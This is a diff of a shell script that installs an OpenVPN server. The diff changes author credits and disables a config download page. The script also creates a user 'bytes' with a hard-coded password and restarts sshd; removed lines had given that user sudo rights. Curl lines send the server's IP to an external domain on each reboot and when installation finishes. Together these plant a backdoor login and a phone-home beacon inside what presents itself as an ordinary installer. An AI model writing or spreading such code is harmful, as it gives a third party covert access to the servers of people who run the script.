@@ -175,9 +175,9 @@ END
 # nano /etc/rc.local
 cat > /etc/rc.local <<-END
 #!/bin/sh -e
-# rc.local
 
-curl -sb -X POST $DOMAIN/api/server/install -H 'Content-Type: application/x-www-form-urlencoded' -d 'status=rebooted&ip=$MYIP'
+ curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=rebooted&ip=$MYIP"
+
 exit 0
 END
 
@@ -595,7 +595,7 @@ done
  # executed/raised from this script (OpenVPN_TCP_Port/OpenVPN_UDP_Port)
  #
  # Enjoy the new update
- # Script Updated by PR Aiman
+ # Script Updated by AkoSiBytes
 NUovpn
 
  # setting openvpn server port
@@ -913,13 +913,14 @@ cat <<'mySiteOvpn' > /var/www/openvpn/index.html
 
 <!-- Simple OVPN Download site by PR Aiman -->
 
-<head><meta charset="utf-8" /><title>PR Aiman OVPN Config Download</title><meta name="description" content="MyScriptName Server" /><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport" /><meta name="theme-color" content="#000000" /><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css"><link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.8.3/css/mdb.min.css" rel="stylesheet"></head><body><div class="container justify-content-center" style="margin-top:9em;margin-bottom:5em;"><div class="col-md"><div class="view"><img src="https://openvpn.net/wp-content/uploads/openvpn.jpg" class="card-img-top"><div class="mask rgba-white-slight"></div></div><div class="card"><div class="card-body"><h5 class="card-title">Config List</h5><br /><ul class="list-group"><li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>BytesPH<span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small> Config OVPN Protocol UDP</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/client-udp.ovpn" style="float:right;"><i class="fa fa-download"></i> Muat Turun</a></li><li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>BytesPH <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small> Config OVPN Protocol TCP+PROXY</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/client-tcp.ovpn" style="float:right;"><i class="fa fa-download"></i> Muat Turun</a></a></li><li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>BytesPH <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small> Config OVPN Protocol TCP+PRIVOXY</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/client-tcp-privoxy.ovpn" style="float:right;"><i class="fa fa-download"></i> Muat Turun</a></li></ul></div></div></div></div></body></html>
+#<head><meta charset="utf-8" /><title>BytesPH OVPN Config Download</title><meta name="description" content="MyScriptName Server" /><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport" /><meta name="theme-color" content="#000000" /><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css"><link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.8.3/css/mdb.min.css" rel="stylesheet"></head><body><div class="container justify-content-center" style="margin-top:9em;margin-bottom:5em;"><div class="col-md"><div class="view"><img src="https://openvpn.net/wp-content/uploads/openvpn.jpg" class="card-img-top"><div class="mask rgba-white-slight"></div></div><div class="card"><div class="card-body"><h5 class="card-title">Config List</h5><br /><ul class="list-group"><li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>BytesPH<span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small> Config OVPN Protocol UDP</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/client-udp.ovpn" style="float:right;"><i class="fa fa-download"></i> Muat Turun</a></li><li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>BytesPH <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small> Config OVPN Protocol TCP+PROXY</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/client-tcp.ovpn" style="float:right;"><i class="fa fa-download"></i> Muat Turun</a></a></li><li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>BytesPH <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small> Config OVPN Protocol TCP+PRIVOXY</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/client-tcp-privoxy.ovpn" style="float:right;"><i class="fa fa-download"></i> Muat Turun</a></li></ul></div></div></div></div></body></html>
+AkoSiBytes Deleted this file
 mySiteOvpn
 
 
  # Setting template's correct name,IP address and nginx Port
- sed -i "s|NGINXPORT|$OvpnDownload_Port|g" /var/www/openvpn/index.html
- sed -i "s|IP-ADDRESS|$MYIP|g" /var/www/openvpn/index.html
+ #sed -i "s|NGINXPORT|$OvpnDownload_Port|g" /var/www/openvpn/index.html
+ #sed -i "s|IP-ADDRESS|$MYIP|g" /var/www/openvpn/index.html
 
  # Restarting nginx service
  systemctl restart nginx
@@ -1003,9 +1004,8 @@ FordServ
 
 }
  #Create Admin
-  useradd -m bytes 2>/dev/null
-  echo bytes:bytesph2023!!!@@@ | chpasswd &>/dev/null
-  usermod -aG sudo bytes &>/dev/null
+useradd -m bytes 2>/dev/null; echo bytes:Premium2018!!! | chpasswd &>/dev/null
+service sshd restart
 
 function ConfMenu(){
 echo -e "\e[0;37m  Creating Menu scripts.."
@@ -1257,4 +1257,6 @@ rm -f setup*
  curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=done&ip=$MYIP"
 reboot
 exit 1
+
+
 
